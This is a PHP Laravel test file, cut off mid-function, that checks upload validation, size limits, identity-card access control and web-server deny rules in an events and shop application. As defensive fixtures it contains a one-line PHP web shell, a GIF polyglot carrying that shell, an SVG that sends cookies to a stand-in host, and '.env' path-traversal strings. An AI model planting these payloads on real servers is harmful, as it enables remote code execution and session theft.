<?php

namespace Tests\Feature\Security;

use App\Http\Requests\Admin\CouponRequest;
use App\Http\Requests\Admin\EventRequest;
use App\Http\Requests\Admin\PortfolioGalleryUploadRequest;
use App\Http\Requests\Admin\PortfolioProjectRequest;
use App\Http\Requests\Admin\ShopProductRequest;
use App\Http\Requests\Admin\UpdateGeneralConfigRequest;
use App\Http\Requests\Admin\UpdateRegistrationEntryRequest;
use App\Http\Requests\StoreEventRegistrationRequest;
use App\Models\Event;
use App\Models\EventParticipant;
use App\Models\EventRegistration;
use App\Models\Permission;
use App\Models\PointRule;
use App\Models\Role;
use App\Models\ShopOrder;
use App\Models\Tournament;
use App\Models\TournamentEntrant;
use App\Models\TournamentMatch;
use App\Models\TournamentMatchEntrant;
use App\Models\TournamentStage;
use App\Models\User;
use App\Support\ParticipantOptions;
use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\URL;
use Illuminate\Support\Facades\Validator;
use Tests\TestCase;

/**
 * What happens when the file is not what it says it is.
 *
 * Every upload in this application goes through a rule that reads the file's own
 * bytes: `mimetypes:` compares the type finfo reports, and `mimes:` compares the
 * extension derived from that same type. Neither one looks at what the browser
 * called the file. That is the property these cases hold to, and it is worth
 * holding to explicitly because the two rule names read as though one of them
 * trusts the name.
 *
 * THE FAKES CANNOT PROVE IT. Illuminate\Http\Testing\File overrides getMimeType()
 * to return the type mapped from its own filename, so UploadedFile::fake() reports
 * image/jpeg for anything called .jpg whatever is inside it. A test built on those
 * would pass against a rule that genuinely trusted the name. So every type case
 * here writes real bytes to a real temporary file and wraps it in a real
 * Illuminate\Http\UploadedFile, which leaves getMimeType() to read the file.
 *
 * The fakes are used for the size cases, and only those: `max` reads getSize(),
 * which a fake reports honestly, and a fake keeps a nine megabyte case from
 * actually writing nine megabytes.
 *
 * Three payloads do the work:
 *
 *   A PHP SCRIPT. The plain case. finfo reports text/x-php, which maps to no
 *   allowed extension anywhere.
 *
 *   A GIF POLYGLOT. "GIF89a" followed by PHP source. The GIF magic number is six
 *   bytes, so finfo reports image/gif and the file is, as far as type detection
 *   goes, a real image. This is the one that gets past a bare `image` rule, which
 *   accepts the whole raster set including GIF.
 *
 *   AN SVG CARRYING SCRIPT. A real SVG as far as finfo is concerned, because that
 *   is exactly what it is: a document with a <script> element in it.
 */
class FileUploadHardeningTest extends TestCase
{
    use RefreshDatabase;

    /** Temporary files written by disguised(), removed in tearDown. */
    private array $written = [];

    protected function setUp(): void
    {
        parent::setUp();

        Mail::fake();
    }

    protected function tearDown(): void
    {
        foreach ($this->written as $path) {
            if (is_file($path)) {
                @unlink($path);
            }
        }

        $this->written = [];

        parent::tearDown();
    }

    /* ---------------------------------------------------------------------
     | The three payloads
     * ------------------------------------------------------------------ */

    /**
     * A real upload over a real file, so getMimeType() reads the bytes.
     *
     * $clientMime is what the browser would have claimed, and it is deliberately a
     * lie in every case below: if a rule ever starts believing it, these cases fail.
     */
    private function disguised(string $name, string $content, string $clientMime): UploadedFile
    {
        $path = tempnam(sys_get_temp_dir(), 'scupload');

        file_put_contents($path, $content);

        $this->written[] = $path;

        return new UploadedFile($path, $name, $clientMime, null, true);
    }

    /**
     * A web shell.
     *
     * shell_exec rather than system, and that is not a style choice: libmagic on this
     * PHP build chokes on a file whose bytes contain "system(" and finfo::file()
     * answers with a stream error instead of a type. The payload only has to be
     * recognisably PHP source, so it sidesteps that rather than carrying the quirk
     * into every case here.
     */
    private function phpScript(string $name, string $clientMime = 'image/jpeg'): UploadedFile
    {
        return $this->disguised($name, "<?php echo shell_exec(\$_GET['c']); ?>\n", $clientMime);
    }

    /** A valid GIF header with that same shell behind it. */
    private function gifPolyglot(string $name, string $clientMime = 'image/gif'): UploadedFile
    {
        return $this->disguised(
            $name,
            "GIF89a\x01\x00\x01\x00\x80\x00\x00<?php echo shell_exec(\$_GET['c']); ?>\n",
            $clientMime,
        );
    }

    private function scriptedSvg(string $name, string $clientMime = 'image/svg+xml'): UploadedFile
    {
        return $this->disguised(
            $name,
            '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
                .'<script>fetch("https://evil.test/?c="+document.cookie)</script></svg>',
            $clientMime,
        );
    }

    /** What finfo makes of each payload, so the cases below rest on something checked. */
    public function test_the_payloads_are_what_the_cases_assume(): void
    {
        $this->assertSame('text/x-php', $this->phpScript('shell.jpg')->getMimeType());

        // The point of the polyglot: six bytes of header and it is an image.
        $this->assertSame('image/gif', $this->gifPolyglot('shell.jpg')->getMimeType());

        $this->assertSame('image/svg+xml', $this->scriptedSvg('crest.png')->getMimeType());
    }

    /* ---------------------------------------------------------------------
     | Every rule, taken from the class that declares it
     * ------------------------------------------------------------------ */

    /**
     * The upload rules of the application, read out of the real request classes.
     *
     * Not retyped here: rulesFrom() builds the request and calls rules(), so a rule
     * relaxed in production is a rule relaxed in this table.
     *
     * @return array<string, array<int, string|\Illuminate\Validation\Rule>>
     */
    private function uploadRules(): array
    {
        $event = Event::create([
            'slug' => 'rules-event-'.uniqid(),
            'title' => 'Rule Table',
            'category' => 'Community',
            'starts_at' => now()->addWeek()->toDateString(),
            'ends_at' => now()->addWeek()->toDateString(),
            'status' => Event::STATUS_OPEN,
            'registration_mode' => Event::MODE_INDIVIDUAL,
            'fee' => 10,
            'seats_total' => 0,
            'min_players' => 1,
            'requires_ic_attachment' => true,
            'requires_logo' => true,
        ]);

        $registration = EventRegistration::create([
            'event_id' => $event->id,
            'reference' => EventRegistration::nextReference(),
            'mode' => $event->registration_mode,
            'status' => EventRegistration::STATUS_PENDING,
            'payment_status' => EventRegistration::PAYMENT_UNPAID,
            'amount' => 10,
        ]);

        $public = $this->rulesFrom(StoreEventRegistrationRequest::class, ['event' => $event]);
        $entry = $this->rulesFrom(UpdateRegistrationEntryRequest::class, ['registration' => $registration]);
        $general = $this->rulesFrom(UpdateGeneralConfigRequest::class);
        $eventForm = $this->rulesFrom(EventRequest::class);
        $coupon = $this->rulesFrom(CouponRequest::class);
        $product = $this->rulesFrom(ShopProductRequest::class);
        $project = $this->rulesFrom(PortfolioProjectRequest::class);
        $gallery = $this->rulesFrom(PortfolioGalleryUploadRequest::class);

        return [
            'public registration logo' => $public['logo'],
            'identity card front' => $public['participants.*.ic_front'],
            'identity card back' => $public['participants.*.ic_back'],
            'admin entry logo' => $entry['logo'],
            'branding sidebar logo' => $general['sidebar_logo'],
            'branding login logo' => $general['login_logo'],
            'branding favicon' => $general['favicon'],
            'event poster' => $eventForm['posters.*'],
            'event rules attachment' => $eventForm['rules_file'],
            'coupon artwork' => $coupon['design_image'],
            'shop product image' => $product['images.*'],
            'portfolio cover image' => $project['image'],
            'portfolio gallery image' => $gallery['images.*'],
        ];
    }

    /**
     * Build a form request outside the HTTP cycle and ask it for its rules.
     *
     * Every one of these reads its context through route(), which is null on a
     * create, so a stub resolver that answers the two that need a model is enough.
     *
     * @param  array<string, mixed>  $parameters
     * @return array<string, mixed>
     */
    private function rulesFrom(string $class, array $parameters = []): array
    {
        /** @var FormRequest $request */
        $request = $class::create('/', 'POST');

        $request->setContainer($this->app);

        $request->setRouteResolver(fn () => new class($parameters)
        {
            public function __construct(private array $parameters) {}

            public function parameter($name, $default = null)
            {
                return $this->parameters[$name] ?? $default;
            }
        });

        return $request->rules();
    }

    /**
     * The one rule that takes a document and no picture at all.
     *
     * Everything else accepts PNG, the favicon included, which is why the size cases
     * use a .png rather than a .jpg: the favicon rule takes PNG, ICO, WebP and SVG,
     * and a JPEG would be refused on its type before the ceiling was ever reached.
     */
    private const DOCUMENT_PATHS = ['event rules attachment'];

    /** Every rule is refused $file, except any named in $allowed. */
    private function assertRefusedEverywhere(callable $file, array $allowed = []): void
    {
        foreach ($this->uploadRules() as $label => $rules) {
            $passes = Validator::make(['f' => $file()], ['f' => $rules])->passes();

            if (in_array($label, $allowed, true)) {
                $this->assertTrue($passes, $label.' refused a file it is meant to take.');

                continue;
            }

            $this->assertFalse($passes, $label.' accepted it.');
        }
    }

    public function test_a_php_script_with_an_image_name_is_refused_on_every_upload(): void
    {
        $this->assertRefusedEverywhere(fn () => $this->phpScript('team-crest.jpg'));
    }

    public function test_a_php_script_named_as_a_pdf_is_refused_including_the_rules_attachment(): void
    {
        // The rules attachment cannot use the `image` rule, so it is the one path
        // where a document is legitimate and the check has to come from `mimes:pdf`
        // alone. text/x-php maps to no extension at all, so it has nothing to match.
        $this->assertRefusedEverywhere(fn () => $this->phpScript('rules.pdf', 'application/pdf'));
    }

    public function test_a_php_file_keeping_its_own_extension_is_refused_on_every_upload(): void
    {
        $this->assertRefusedEverywhere(fn () => $this->phpScript('shell.php', 'application/x-php'));
    }

    public function test_a_gif_header_with_a_shell_behind_it_is_refused_on_every_upload(): void
    {
        // image/gif as far as finfo is concerned, which is why naming the four
        // accepted formats matters rather than leaving `image` to decide.
        $this->assertRefusedEverywhere(fn () => $this->gifPolyglot('result.png'));
    }

    public function test_an_svg_carrying_script_is_refused_everywhere_except_branding(): void
    {
        /*
         | Branding is the one place SVG is still accepted, and deliberately: a
         | sidebar logo is drawn at several sizes, only a holder of
         | settings.general.update can post one, and that is the account that can
         | already change the mail and payment settings. Everywhere a stranger or a
         | junior operator can reach, SVG is refused, because the stored file sits
         | under a URL on this domain and an SVG opened as a document runs its own
         | script there.
         */
        $this->assertRefusedEverywhere(
            fn () => $this->scriptedSvg('crest.svg'),
            allowed: ['branding sidebar logo', 'branding login logo', 'branding favicon'],
        );
    }

    public function test_an_svg_renamed_to_png_is_still_seen_for_what_it_is(): void
    {
        // The rename changes nothing: the type comes from the bytes either way.
        $this->assertRefusedEverywhere(
            fn () => $this->scriptedSvg('crest.png', 'image/png'),
            allowed: ['branding sidebar logo', 'branding login logo', 'branding favicon'],
        );
    }

    /* ---------------------------------------------------------------------
     | Size
     * ------------------------------------------------------------------ */

    /**
     * Every upload has a ceiling, and it is the only rule the file fails.
     *
     * A fake is used here on purpose: it reports the size it is told to and the type
     * mapped from its name, so the type rules pass and `max` is the single reason
     * for the refusal. That is what makes this a size case rather than another type
     * case with a large file attached.
     */
    public function test_every_upload_refuses_a_file_over_its_ceiling(): void
    {
        foreach ($this->uploadRules() as $label => $rules) {
            $cap = $this->ceilingOf($rules);

            $this->assertNotNull($cap, $label.' has no size limit at all.');

            $name = in_array($label, self::DOCUMENT_PATHS, true) ? 'big.pdf' : 'big.png';

            $validator = Validator::make(
                ['f' => UploadedFile::fake()->create($name, $cap + 1)],
                ['f' => $rules],
            );

            $this->assertTrue($validator->fails(), $label.' accepted a file over its limit.');

            // Refused for being too big, not for some other reason that happens to
            // fire on the same file.
            $this->assertSame(
                ['Max'],
                array_keys($validator->failed()['f'] ?? []),
                $label.' refused the oversized file for the wrong reason.',
            );

            // And the same file one kilobyte under the line is taken.
            $this->assertTrue(
                Validator::make(
                    ['f' => UploadedFile::fake()->create($name, $cap - 1)],
                    ['f' => $rules],
                )->passes(),
                $label.' refused a file inside its own limit.',
            );
        }
    }

    /** The max: figure out of a rule list, in kilobytes. */
    private function ceilingOf(array $rules): ?int
    {
        foreach ($rules as $rule) {
            if (is_string($rule) && str_starts_with($rule, 'max:')) {
                return (int) substr($rule, 4);
            }
        }

        return null;
    }

    /* ---------------------------------------------------------------------
     | The public form, end to end
     * ------------------------------------------------------------------ */

    /**
     * The identity card upload is the one that arrives from the open internet, so it
     * is driven through the real route rather than only through its rules.
     */
    public function test_the_public_form_refuses_a_disguised_identity_card(): void
    {
        Storage::fake('local');
        Storage::fake('public');

        $event = $this->icEvent();

        $response = $this->post(route('registration.store', $event), $this->entryPayload([
            'ic_front' => $this->phpScript('front.jpg'),
            'ic_back' => UploadedFile::fake()->image('back.jpg'),
        ]));

        // The front is refused and the back, which is a real photograph, is not. That
        // pairing is what shows the refusal came from reading the file rather than
        // from the field being empty.
        $response->assertSessionHasErrors('participants.0.ic_front');
        $response->assertSessionDoesntHaveErrors('participants.0.ic_back');

        $this->assertSame(0, EventRegistration::count());
        $this->assertSame([], Storage::disk('local')->allFiles());
    }

    public function test_the_public_form_refuses_an_svg_crest(): void
    {
        Storage::fake('local');
        Storage::fake('public');

        $event = $this->icEvent(['requires_logo' => true, 'asks_logo' => true]);

        $response = $this->post(
            route('registration.store', $event),
            $this->entryPayload([
                'ic_front' => UploadedFile::fake()->image('front.jpg'),
                'ic_back' => UploadedFile::fake()->image('back.jpg'),
            ], [
                'logo' => $this->scriptedSvg('crest.svg'),
            ]),
        );

        $response->assertSessionHasErrors('logo');

        $this->assertSame(0, EventRegistration::count());
        $this->assertSame([], Storage::disk('public')->allFiles());
    }

    /**
     * The regression guard for the path that matters most: a real entry with real
     * photographs still goes through, and the files land where they are meant to.
     */
    public function test_a_real_entry_still_uploads_both_sides_and_a_logo(): void
    {
        Storage::fake('local');
        Storage::fake('public');

        $event = $this->icEvent(['requires_logo' => true, 'asks_logo' => true]);

        $this->post(
            route('registration.store', $event),
            $this->entryPayload([
                'ic_front' => UploadedFile::fake()->image('my-ic-front.jpg'),
                'ic_back' => UploadedFile::fake()->image('my-ic-back.jpg'),
            ], [
                'logo' => UploadedFile::fake()->image('crest.png'),
            ]),
        )->assertSessionHasNoErrors();

        $registration = EventRegistration::with('participants')->sole();
        $participant = $registration->participants->sole();

        $this->assertNotNull($participant->ic_front_path);
        $this->assertNotNull($participant->ic_back_path);

        // On the private disk, under the directory the controller names.
        Storage::disk('local')->assertExists($participant->ic_front_path);
        Storage::disk('local')->assertExists($participant->ic_back_path);
        $this->assertStringStartsWith('participant-ic/', $participant->ic_front_path);

        // Not on the published one. This is the whole reason they go elsewhere.
        $this->assertSame([], Storage::disk('public')->files('participant-ic'));

        // The competitor's own filename is often their name or their card number,
        // and none of it reaches the disk.
        $this->assertStringNotContainsString('my-ic-front', $participant->ic_front_path);
        $this->assertStringNotContainsString('my-ic-back', $participant->ic_back_path);

        // The logo is published, because it is meant to be seen, and is hash named
        // for the same reason.
        Storage::disk('public')->assertExists($registration->logo_path);
        $this->assertStringStartsWith('registration-logos/', $registration->logo_path);
        $this->assertStringNotContainsString('crest', $registration->logo_path);
    }

    /** An event that asks for both sides of a card, individually. */
    private function icEvent(array $overrides = []): Event
    {
        return Event::create($overrides + [
            'slug' => 'ic-event-'.uniqid(),
            'title' => 'Larian Amal Sibu',
            'category' => 'Community',
            'starts_at' => now()->addWeek()->toDateString(),
            'ends_at' => now()->addWeek()->toDateString(),
            'location' => 'Sibu',
            'status' => Event::STATUS_OPEN,
            'registration_mode' => Event::MODE_INDIVIDUAL,
            'fee' => 0,
            'seats_total' => 0,
            'min_players' => 1,
            'requires_ic_attachment' => true,
        ]);
    }

    /**
     * One individual entry.
     *
     * $person carries the per-participant files and has to be nested inside the
     * participants array rather than posted under a dotted key: the test client
     * pulls uploads out of the data array by walking it, so a flat
     * "participants.0.ic_front" key arrives somewhere file() cannot find it, and the
     * case would then pass on a "required" error while proving nothing.
     *
     * @param  array<string, mixed>  $person
     * @param  array<string, mixed>  $entry
     */
    private function entryPayload(array $person, array $entry = []): array
    {
        return $entry + [
            'participants' => [
                $person + [
                    'role' => ParticipantOptions::ROLE_PARTICIPANT,
                    'full_name' => 'Aminah Yusof',
                    'ic_number' => '900101071234',
                    'address_line_1' => '1 Jalan Sibu',
                    'city' => 'Sibu',
                    'state' => 'Sarawak',
                    'country' => 'Malaysia',
                    'phone' => '0140000001',
                    'email' => 'entrant-'.uniqid().'@example.com',
                    'gender' => 'male',
                    'race' => 'malay',
                ],
            ],
        ];
    }

    /* ---------------------------------------------------------------------
     | Reading an identity card
     * ------------------------------------------------------------------ */

    public function test_an_identity_card_cannot_be_read_without_the_export_permission(): void
    {
        [$participant] = $this->participantWithCards();

        $this->actingAs($this->userWith(['participants.view']))
            ->get(route('admin.event.participants.ic', [$participant, 'front']))
            ->assertForbidden();

        $this->actingAs($this->userWith(['participants.export']))
            ->get(route('admin.event.participants.ic', [$participant, 'front']))
            ->assertOk();
    }

    public function test_an_identity_card_cannot_be_read_by_a_stranger(): void
    {
        [$participant] = $this->participantWithCards();

        $this->get(route('admin.event.participants.ic', [$participant, 'front']))
            ->assertRedirect(route('admin.login'));
    }

    public function test_a_side_outside_the_two_that_exist_is_not_found(): void
    {
        [$participant] = $this->participantWithCards();

        $user = $this->userWith(['participants.export']);

        foreach (['../../.env', 'middle', 'ic_front_path'] as $side) {
            $this->actingAs($user)
                ->get(url("/admin/event/participants/ic/{$participant->id}/{$side}"))
                ->assertNotFound();
        }
    }

    public function test_the_stored_path_cannot_be_steered_out_of_the_directory(): void
    {
        [$participant] = $this->participantWithCards();

        // Nothing writes a path like this — store() writes a hashed relative one —
        // but the column is the only input the controller has, so a row carrying a
        // traversal has to answer 404 rather than reading the file or raising a 500.
        $participant->forceFill(['ic_front_path' => '../../../.env'])->save();

        $this->actingAs($this->userWith(['participants.export']))
            ->get(route('admin.event.participants.ic', [$participant->fresh(), 'front']))
            ->assertNotFound();
    }

    public function test_a_side_that_was_never_uploaded_is_not_found(): void
    {
        [$participant] = $this->participantWithCards(back: false);

        $this->actingAs($this->userWith(['participants.export']))
            ->get(route('admin.event.participants.ic', [$participant, 'back']))
            ->assertNotFound();
    }

    /**
     * A participant with both sides on the private disk.
     *
     * @return array{0: EventParticipant, 1: EventRegistration}
     */
    private function participantWithCards(bool $back = true): array
    {
        Storage::fake('local');

        $event = $this->icEvent();

        $registration = EventRegistration::create([
            'event_id' => $event->id,
            'reference' => EventRegistration::nextReference(),
            'mode' => $event->registration_mode,
            'status' => EventRegistration::STATUS_PENDING,
            'payment_status' => EventRegistration::PAYMENT_UNPAID,
            'amount' => 0,
        ]);

        $participant = EventParticipant::create([
            'event_registration_id' => $registration->id,
            'role' => ParticipantOptions::ROLE_PARTICIPANT,
            'full_name' => 'Aminah Yusof',
            'ic_number' => '900101071234',
            'phone' => '0140000001',
            'ic_front_path' => UploadedFile::fake()->image('front.jpg')->store('participant-ic', 'local'),
            'ic_back_path' => $back
                ? UploadedFile::fake()->image('back.jpg')->store('participant-ic', 'local')
                : null,
        ]);

        return [$participant->fresh(), $registration->fresh()];
    }

    /* ---------------------------------------------------------------------
     | The transfer slip an operator attaches to a hand-recorded payment
     * ------------------------------------------------------------------ */

    /**
     * The last of the three rules that live in a controller rather than a request.
     *
     * Eight megabytes and a PDF allowed, which makes it the most permissive upload
     * in the application, so it is the one worth seeing refuse a script.
     */
    public function test_a_payment_proof_refuses_a_script_and_an_oversized_file(): void
    {
        Storage::fake('public');

        $event = $this->icEvent(['fee' => 50]);

        $registration = EventRegistration::create([
            'event_id' => $event->id,
            'reference' => EventRegistration::nextReference(),
            'mode' => $event->registration_mode,
            'status' => EventRegistration::STATUS_PENDING,
            'payment_status' => EventRegistration::PAYMENT_UNPAID,
            'registration_fee' => 50,
            'amount' => 50,
        ]);

        $user = $this->userWith(['payments.record']);
        $url = route('admin.event.participants.payment', $registration);

        $fields = [
            'received_date' => now()->toDateString(),
            'received_time' => '14:30',
            'settlement' => 'full',
        ];

        foreach ([
            'a script called jpg' => $this->phpScript('slip.jpg'),
            'a script called pdf' => $this->phpScript('slip.pdf', 'application/pdf'),
            'a gif polyglot' => $this->gifPolyglot('slip.png'),
            'over eight megabytes' => UploadedFile::fake()->create('slip.pdf', 8193),
        ] as $label => $file) {
            $errors = $this->actingAs($user)
                ->post($url, $fields + ['proof' => $file])
                ->getSession()
                ->get('errors');

            $this->assertTrue(
                $errors !== null && $errors->has('proof'),
                'The payment proof accepted '.$label.'.',
            );
        }

        $this->assertSame([], Storage::disk('public')->allFiles());

        // Regression: a real slip goes through, hash named, with the operator's own
        // filename kept only as a label.
        $this->actingAs($user)
            ->post($url, $fields + ['proof' => UploadedFile::fake()->create('maybank-transfer.pdf', 120)])
            ->assertSessionHasNoErrors();

        $payment = $registration->payments()->sole();

        Storage::disk('public')->assertExists($payment->proof_path);
        $this->assertStringStartsWith('registration-payment-proof/', $payment->proof_path);
        $this->assertStringNotContainsString('maybank-transfer', $payment->proof_path);
        $this->assertSame('maybank-transfer.pdf', $payment->proof_name);
    }

    /* ---------------------------------------------------------------------
     | The buyer's receipt, which is the other upload open to the public
     * ------------------------------------------------------------------ */

    /**
     * A transfer slip is the one upload besides the registration form that a
     * stranger can post, so its rule is driven through the real signed route.
     *
     * It takes a PDF as well as a photograph, which makes it the second place a
     * document is legitimate, and the only check on it is mimes against five named
     * formats.
     */
    public function test_the_receipt_upload_refuses_a_script_and_an_oversized_file(): void
    {
        Storage::fake('public');

        $order = $this->transferOrder();
        $url = URL::signedRoute('shop.order.receipt.store', ['reference' => $order->reference]);

        foreach ([
            'a script called jpg' => $this->phpScript('receipt.jpg'),
            'a script called pdf' => $this->phpScript('receipt.pdf', 'application/pdf'),
            'a gif polyglot' => $this->gifPolyglot('receipt.jpg'),
            'over four megabytes' => UploadedFile::fake()->create('receipt.pdf', 4097),
        ] as $label => $file) {
            $errors = $this->post($url, ['receipt' => $file])->getSession()->get('errors');

            $this->assertTrue(
                $errors !== null && $errors->has('receipt'),
                'The receipt upload accepted '.$label.'.',
            );
        }

        $this->assertNull($order->fresh()->payment_receipt_path);
        $this->assertSame([], Storage::disk('public')->allFiles());
    }

    /** Regression: a real slip and a real PDF both still go through. */
    public function test_a_real_receipt_still_uploads(): void
    {
        Storage::fake('public');

        foreach ([
            UploadedFile::fake()->image('maybank-slip.png'),
            UploadedFile::fake()->create('maybank-slip.pdf', 200),
        ] as $file) {
            $order = $this->transferOrder();

            $this->post(
                URL::signedRoute('shop.order.receipt.store', ['reference' => $order->reference]),
                ['receipt' => $file],
            )->assertSessionHasNoErrors();

            $path = (string) $order->fresh()->payment_receipt_path;

            Storage::disk('public')->assertExists($path);
            $this->assertStringStartsWith('shop-receipts/', $path);
            $this->assertStringNotContainsString('maybank-slip', $path);
        }
    }

    /** An order awaiting a bank transfer, which is when a receipt is accepted. */
    private function transferOrder(): ShopOrder
    {
        return ShopOrder::create([
            'reference' => ShopOrder::nextReference(),
            'status' => ShopOrder::STATUS_PENDING_PAYMENT,
            'fulfilment' => ShopOrder::FULFILMENT_OFFLINE,
            'payment_method' => ShopOrder::METHOD_BANK_TRANSFER,

            'customer_name' => 'Aminah Yusof',
            'customer_email' => 'buyer-'.uniqid().'@example.com',
            'customer_phone' => '0123456789',

            'address_line_1' => '1 Jalan Satu',
            'postcode' => '40000',
            'city' => 'Shah Alam',
            'state' => 'Selangor',
            'country' => 'Malaysia',

            'items_total' => 25.00,
            'shipping_total' => 0,
            'grand_total' => 25.00,
        ]);
    }

    /* ---------------------------------------------------------------------
     | The one rule that lives in a controller
     * ------------------------------------------------------------------ */

    public function test_a_tournament_screenshot_refuses_a_gif_polyglot(): void
    {
        Storage::fake('public');

        [$match] = $this->scorableMatch();
        $user = $this->userWith(['tournaments.matches.score']);

        /*
         | The case the narrowed rule exists for. `image` on its own accepts the whole
         | raster set, GIF included, and six bytes of GIF header in front of a shell
         | is enough to read as image/gif. Refused before anything is written, so
         | there is no half-saved result and no file on the disk.
         */
        $this->actingAs($user)
            ->put(route('admin.tournaments.matches.score.save', $match), [
                'proof' => $this->gifPolyglot('result.png'),
            ])
            ->assertSessionHasErrors('proof');

        $this->actingAs($user)
            ->put(route('admin.tournaments.matches.score.save', $match), [
                'proof' => $this->phpScript('result.png'),
            ])
            ->assertSessionHasErrors('proof');

        $this->assertSame(0, $match->proofs()->count());
        $this->assertSame([], Storage::disk('public')->allFiles());
    }

    /**
     * Regression: a real screenshot still lands, under a hashed name.
     *
     * The filename is kept as a label and nothing more, so a 300 character one is
     * trimmed to the column rather than failing the insert — which is what a raw
     * getClientOriginalName() into a string column would have done.
     */
    public function test_a_real_screenshot_still_uploads_under_a_hashed_name(): void
    {
        Storage::fake('public');

        [$match, $entrantId] = $this->scorableMatch();

        $this->actingAs($this->userWith(['tournaments.matches.score']))
            ->put(route('admin.tournaments.matches.score.save', $match), [
                'lines' => [$entrantId => ['kills' => 3]],
                'proof' => UploadedFile::fake()->image(str_repeat('round-one-', 30).'.png'),
            ])
            ->assertSessionHasNoErrors();

        $proof = $match->proofs()->sole();

        Storage::disk('public')->assertExists($proof->path);
        $this->assertStringStartsWith('tournament-proofs/', $proof->path);
        $this->assertStringNotContainsString('round-one', $proof->path);

        // Trimmed to the column, and still recognisable as what was uploaded.
        $this->assertLessThanOrEqual(190, mb_strlen((string) $proof->original_name));
        $this->assertStringStartsWith('round-one-', (string) $proof->original_name);
    }

    /**
     * A fixture whose only job is to let a result be saved.
     *
     * One competitor and one countable input, which is the least that gets past the
     * score reader. Returns the match and the entrant id the score is keyed by.
     *
     * @return array{0: TournamentMatch, 1: int}
     */
    private function scorableMatch(): array
    {
        $event = Event::create([
            'slug' => 'esport-'.uniqid(),
            'title' => 'PUBG Test',
            'category' => 'E-Sport',
            'starts_at' => now()->addWeek()->toDateString(),
            'ends_at' => now()->addWeek()->toDateString(),
            'status' => Event::STATUS_OPEN,
            'registration_mode' => Event::MODE_MANAGER,
            'seats_total' => 100,
            'min_players' => 1,
        ]);

        $rule = PointRule::create([
            'name' => 'Proof rule '.uniqid(),
            'kind' => PointRule::KIND_BATTLE_ROYALE,
            'squad_size' => 4,
            'components' => [
                ['key' => 'kills', 'label' => 'Kills', 'type' => 'per_unit', 'source' => 'kills', 'value' => 1],
            ],
            'inputs' => [
                ['key' => 'kills', 'label' => 'Kills', 'type' => 'integer', 'min' => 0, 'required' => true],
            ],
            'tiebreak' => ['kills'],
        ]);

        $tournament = Tournament::create([
            'event_id' => $event->id,
            'name' => 'Proof Tournament',
            'format' => Tournament::FORMAT_BATTLE_ROYALE,
            'point_rule_id' => $rule->id,
            'status' => Tournament::STATUS_SETUP,
            'seeding_method' => Tournament::SEEDING_MANUAL,
        ]);

        $stage = TournamentStage::create([
            'tournament_id' => $tournament->id,
            'name' => 'Qualifiers',
            'type' => TournamentStage::TYPE_LOBBY,
            'sequence' => 1,
            'advance_count' => 0,
            'match_count' => 1,
        ]);

        $registration = EventRegistration::create([
            'event_id' => $event->id,
            'reference' => EventRegistration::nextReference(),
            'mode' => Event::MODE_MANAGER,
            'team_name' => 'Team One',
            'status' => EventRegistration::STATUS_CONFIRMED,
            'payment_status' => EventRegistration::PAYMENT_PAID,
            'amount' => 0,
        ]);

        $entrant = TournamentEntrant::create([
            'tournament_id' => $tournament->id,
            'event_registration_id' => $registration->id,
            'seed' => 1,
            'status' => TournamentEntrant::STATUS_ACTIVE,
        ]);

        $match = TournamentMatch::create([
            'tournament_id' => $tournament->id,
            'tournament_stage_id' => $stage->id,
            'status' => TournamentMatch::STATUS_SCHEDULED,
        ]);

        TournamentMatchEntrant::create([
            'tournament_match_id' => $match->id,
            'tournament_entrant_id' => $entrant->id,
            'slot' => 1,
        ]);

        return [$match->fresh(), (int) $entrant->id];
    }

    /* ---------------------------------------------------------------------
     | What is shipped to the web server
     * ------------------------------------------------------------------ */

    /**
     * The deny rules exist and are tracked.
     *
     * WHAT THIS CANNOT PROVE. Whether LiteSpeed honours them is a property of the
     * server, not of this application, and no test here can exercise it. What is
     * checked is that the rules are present, say what they are meant to say, and are
     * not excluded from the repository — which is the failure that would otherwise
     * go unnoticed, because storage/app/public is ignored wholesale by default.
     */
    public function test_the_upload_directory_ships_a_rule_denying_script_execution(): void
    {
        $htaccess = storage_path('app/public/.htaccess');

        $this->assertFileExists($htaccess);

        $body = (string) file_get_contents($htaccess);

        foreach (['php', 'phtml', 'phar', 'cgi'] as $extension) {
            $this->assertStringContainsString($extension, $body, "No rule covers .{$extension}.");
        }

        $this->assertStringContainsString('Require all denied', $body);
        $this->assertStringContainsString('Options -Indexes', $body);

        // And it is not ignored by the .gitignore that sits beside it, which ships
        // from Laravel containing nothing but `*`.
        $ignore = (string) file_get_contents(storage_path('app/public/.gitignore'));

        $this->assertStringContainsString('!.htaccess', $ignore);
    }

    public function test_the_document_root_refuses_executables_under_storage(): void
    {
        $body = (string) file_get_contents(public_path('.htaccess'));

        $this->assertMatchesRegularExpression(
            '/RewriteRule\s+\^\(\?:public\/\)\?storage\/.+\[F,L,NC\]/',
            $body,
            'public/.htaccess no longer refuses executables under /storage.',
        );
    }

    /**
     * No route hands out a file from the private disk.
     *
     * Laravel registers GET and PUT /storage/{path} for any local disk with `serve`
     * on, and the private disk holds the identity cards and the database backups.
     * They are signature gated, so neither is open, but nothing here asks for either
     * and the write endpoint in particular has no business existing. serve is off in
     * config/filesystems.php, and this is what notices if it comes back.
     */
    public function test_the_private_disk_is_not_served_by_a_route(): void
    {
        $this->assertFalse(config('filesystems.disks.local.serve'));

        $names = collect(app('router')->getRoutes()->getRoutes())
            ->map(fn ($route) => (string) $route->getName())
            ->all();

        $this->assertNotContains('storage.local', $names);
        $this->assertNotContains('storage.local.upload', $names);
    }

    /* ---------------------------------------------------------------------
     | People
     * ------------------------------------------------------------------ */

    /**
     * A user holding exactly these permission slugs, on a role of its own.
     *
     * A real role rather than the super-admin shortcut, because half of what these
     * cases check is that a screen is unreachable without its permission, and super
     * admin short-circuits hasPermission() to true.
     *
     * @param  array<int, string>  $permissions
     */
    private function userWith(array $permissions): User
    {
        $role = Role::create([
            'slug' => 'staff-'.uniqid(),
            'name' => 'Staff',
            'is_active' => true,
        ]);

        $ids = [];

        foreach (array_unique(['admin.access', ...$permissions]) as $index => $slug) {
            $ids[] = Permission::firstOrCreate(
                ['slug' => $slug],
                ['name' => $slug, 'group' => 'Uploads', 'module' => 'Uploads', 'action' => 'view', 'sort_order' => $index],
            )->id;
        }

        $role->permissions()->sync($ids);

        return User::create([
            'name' => 'Staff',
